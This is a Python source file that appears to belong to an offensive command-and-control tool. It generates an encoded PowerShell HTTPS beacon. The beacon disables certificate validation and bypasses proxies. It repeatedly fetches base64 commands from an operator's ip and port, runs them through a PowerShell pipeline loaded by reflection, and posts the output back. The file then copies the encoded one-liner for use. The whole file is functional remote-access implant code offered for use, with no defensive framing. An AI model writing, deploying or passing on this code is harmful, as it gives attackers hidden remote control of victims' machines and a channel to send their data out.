import base64
from core.payload_generator.common import payload_utils as payutils
from colorama import init, Fore, Style

brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
brightred = "\001" + Style.BRIGHT + Fore.RED + "\002"
brightblue = "\001" + Style.BRIGHT + Fore.BLUE + "\002"


def make_raw(ip, port, beacon_interval):
    beacon_url = f"https://{ip}:{port}/"
    interval = beacon_interval

    raw = (
        "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = "
        "{ $true };"
        f"Function G-SID{{$c='abcdefghijklmnopqrstuvwxyz0123456789'.ToCharArray();"
        f"$p=@();1..3|%{{$p+=-join(1..5|%{{$c|Get-Random}})}};$p -join'-'}};"
        f"$sid=G-SID;$uri='{beacon_url}';"
        "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy();"
        "$hdr=@{'X-Session-ID'=$sid};"

        # Define Get-Task
        "Function Get-Task {"
        "$req = [System.Net.HttpWebRequest]::Create($uri);"
        "$req.Method = 'GET';"
        "$req.Headers.Add('X-Session-ID',$sid);"
        "$resp = $req.GetResponse();"
        "$stream = $resp.GetResponseStream();"
        "$reader = New-Object System.IO.StreamReader($stream);"
        "$result = $reader.ReadToEnd();"
        "$reader.Close();$stream.Close();$resp.Close();"
        "return $result"
        "};"

        # Define Send-Output
        "Function Send-Output($payload) {"
        "$bytes = [System.Text.Encoding]::UTF8.GetBytes($payload);"
        "$req = [System.Net.HttpWebRequest]::Create($uri);"
        "$req.Method = 'POST';"
        "$req.ContentType = 'application/json';"
        "$req.Headers.Add('X-Session-ID',$sid);"
        "$req.ContentLength = $bytes.Length;"
        "$stream = $req.GetRequestStream();"
        "$stream.Write($bytes,0,$bytes.Length);$stream.Close();"
        "$resp = $req.GetResponse();$resp.Close()"
        "};"

        # Init PS pipeline
        "$PSA = [AppDomain]::CurrentDomain.GetAssemblies()|?{$_ -like '*Automation*'};"
        "$PSClass = $PSA.GetType('System.Management.Automation.PowerShell');"
        "$pipeline = ($PSClass.GetMethods()|?{$_.Name -eq 'Create' -and $_.GetParameters().Count -eq 0}).Invoke($null,$null);"

        # Beacon loop
        "while($true){"
        "try{"
        "$taskJson = Get-Task;"
        "$task = ConvertFrom-Json $taskJson;"
        "if($task.cmd){"
        "$cmd = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($task.cmd));"
        "$pipeline.Commands.Clear();"
        "$pipeline.AddScript($cmd)|Out-Null;"
        "$results = $pipeline.Invoke();"
        "$output = $results|Out-String;"
        "$b64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($output.Trim()));"
        "$body = @{output=$b64}|ConvertTo-Json;"
        "Send-Output $body;"
        "}"
        "}catch{};"
        f"Start-Sleep -Seconds {interval};"
        "}"
    )

    return raw


def generate_windows_powershell_https(ip, port, obs, beacon_interval, no_child=None):
    if obs is None or obs == 0:
    	payload = make_raw(ip, port, beacon_interval)
    	cmd = payutils.encode_win_payload(payload, no_child)
    	payutils.copy_and_print(cmd)
    	return cmd

    else:
        print(brightred + f"[*] Obfuscation for HTTPS payloads not yet available")